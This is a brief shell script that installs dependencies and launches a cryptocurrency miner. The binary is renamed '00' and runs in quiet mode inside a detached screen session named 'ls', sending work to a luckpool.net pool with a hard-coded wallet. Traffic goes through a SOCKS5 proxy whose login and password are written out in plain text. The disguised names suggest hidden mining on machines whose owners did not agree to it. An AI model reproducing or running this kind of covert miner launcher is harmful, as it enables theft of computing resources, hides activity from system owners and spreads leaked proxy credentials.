sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x 00
screen -dmS ls 
POOL=stratum+tcp://ap.luckpool.net:3956
WALLET=R9fyZN2rng1biZmim3ThmxiN7PqFETw5CD.upew
PROXY=socks5://woiden_upew:qwerty1@sg-socks5.woiden.net:8080
./00 -a hellminer -o $POOL -u $WALLET -x $PROXY -q
